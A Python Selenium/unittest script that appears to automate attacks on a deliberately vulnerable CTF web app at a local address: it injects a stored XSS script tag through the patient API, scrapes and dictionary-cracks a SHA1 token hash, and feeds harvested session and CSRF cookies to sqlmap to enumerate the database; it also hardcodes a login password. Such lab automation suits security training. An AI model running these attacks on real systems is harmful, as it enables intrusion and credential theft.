from selenium import webdriver
from termcolor import colored
import hashlib, sys,os,subprocess
from datetime import datetime
import unittest,requests,json,time,re
from requests.auth import HTTPBasicAuth,HTTPDigestAuth
from selenium.common.exceptions import UnexpectedAlertPresentException
from jinja2 import Environment, FileSystemLoader
from selenium.webdriver.support.ui import Select

host = '192.168.1.25'
SQLMAP_PATH = os.path.dirname(os.path.abspath(__file__)) + '\Sqlmap_master\\'

class BaseClass(unittest.TestCase):
	def load_chrome_driver(self):
		return webdriver.Chrome()

	def load_firefox_driver(self):
		return webdriver.Firefox()

	def setUp(self):
		self.driver = self.load_firefox_driver()
		self.username = 'bruce.banner@we45.com'
		self.password = 'Ctfreturns@2016'
		self.driver.maximize_window()

	def authenticate(self):
		driver = self.driver
		driver.get('http://%s/login/'%host)
		time.sleep(1)
		data = {
			'username':self.username,
			'password':self.password
		}
		form = driver.find_element_by_tag_name('form')
		for k,v in data.items():
			elem = form.find_element_by_id("%s"%k) 
			elem.clear()
			elem.send_keys(v)
		form.find_element_by_id('submit').click()  
		time.sleep(1) 

	def tearDown(self):
		self.driver.close()

class XSSTest(BaseClass):
	def load_patient_url(self):
		try:
			self.driver.get('http://%s/patients/'%host)
		except UnexpectedAlertPresentException:
			alert = self.driver.switch_to_alert()
			time.sleep(3)
			alert.accept()

	def xss_request(self):	
		self.load_patient_url()	
		host_url = 'http://%s/api/CTF/patient/'%host		
		r = requests.get(host_url,auth=(self.username,self.password))	
		if int(r.status_code) == 200:
			json_str = json.dumps(r.json())
			object_list = json.loads(json_str).get('objects')		
			if object_list:
				data = object_list[0]
				actual_data = data				
				data['name'] = '<script>alert("XSS Attack!!!")</script>'
				pk = data['id']
				host_url = 'http://%s/api/CTF/patient/%s/'%(host,pk)
				r = requests.put(host_url,auth=HTTPBasicAuth(self.username,self.password),data=json.dumps(data))
				self.load_patient_url()
				r = requests.put(host_url,auth=HTTPBasicAuth(self.username,self.password),data=json.dumps(actual_data))
				# self.load_patient_url()
		else:
			print r.status_code,r.content
		self.load_patient_url()
		time.sleep(10)

	def test_xss(self):
		self.authenticate()
		self.xss_request()

class SHACrackTest(BaseClass):    
    def test_sha1(self):
        driver = self.driver
        try:
            driver.get("http://%s/"%host)
            driver.get("http://%s/appointment/add/"%host)            
            form = driver.find_element_by_tag_name('form') 
            date = datetime.today().strftime("%Y-%m-%d")   
            form_data = {
                'input':{
                    'name':'Test',
                    'email':'test@test.com',
                    'phone':'999999',  
                    'reason':'Test',
                    'address':'Test'                
                },
                'select':{
                    'gender':'Male',
                    'plan_type':'ConsultantAppointment',
                    'doctor':'Bruce Banner'
                },
                'date':{
                    'dob':'04/09/1991',
                    'datetime':'%s'%date
                }
            }    
            for k,v in form_data.items():
                if k == 'input':
                    for k1,v1 in v.items():
                        elem = form.find_element_by_id("id_%s"%k1)
                        elem.clear()
                        elem.send_keys(v1)
                elif k == 'select':
                    for k1,v1 in v.items():
                        Select(form.find_element_by_id("id_%s"%k1)).select_by_visible_text(v1)
                elif k == 'date':
                    for k1,v1 in v.items():
                        elem = form.find_element_by_id("id_%s"%k1)
                        elem.click()
                        elem.send_keys(v1)            
            form.find_element_by_xpath("//input[@value='Submit']").click()
            time.sleep(2)            
            shadata = driver.find_element_by_xpath("//div[@class='container']/input[@name='token']").get_attribute('value').encode('utf-8')
            data = shadata.split('$')
            hashedstring = data[2]
            print colored ("Identified a hashed string", 'green'), colored (hashedstring , 'magenta')
            print "\n"
            time.sleep(2)            
            with open('password.txt') as dictonarylist:
                listdata = dictonarylist.readlines()
                print colored ("Initializing bruteforce...", 'blue')
                print "\n"
                for lines in listdata:
                    hash_object = hashlib.sha1(lines.rstrip())
                    hex_dig = hash_object.hexdigest()                    
                    if hex_dig == hashedstring:
                        print colored ("The hash is Broken !", 'red'), colored(lines, 'green')
                        break
                    else:
                        print colored ("Bruteforcing with ",'green'), colored(lines, 'cyan')
            time.sleep(2)            
        except BaseException, e:
            exc_type, exc_value, exc_traceback = sys.exc_info()
            print "Line no :%s Exception %s"%(exc_traceback.tb_lineno,e)
        finally:
            driver.close()
	
class SQLTest(BaseClass):    
    def test_request_ctf(self):
        driver = self.driver        
        self.authenticate()
        driver.get("http://%s/tests/"%host)
        form = driver.find_element_by_tag_name('form')
        inp = form.find_element_by_xpath('//div/input[@name="search"]')
        # print inp
        allCookies1 = driver.get_cookies()
        for a in allCookies1:            
            if a.get('name') == "sessionid":
                sessionid1 = a.get('value')                
            if a.get('name') == "java_csrf":
                java_csrf1 = a.get('value')          
        j2_env = Environment(loader=FileSystemLoader(os.getcwd()),trim_blocks=True)
        
        file_data = j2_env.get_template('ctf_test_request.html').render(host=host,java_csrf=java_csrf1,sessionid=sessionid1)        

        f = open(SQLMAP_PATH + "payload.txt",'w')
        f.write(file_data)
        f.close()
        
        sql_file = "sqlmap.py"
        filepath1 = 'payload.txt'
        os.chdir(SQLMAP_PATH)
        options = ['','--current-db','--tables','--columns']
        for o in options:
            command = ['python', sql_file, '-r', filepath1]
            popen = subprocess.Popen(command)
            time.sleep(5)    
    
if __name__ == "__main__":
	unittest.main()
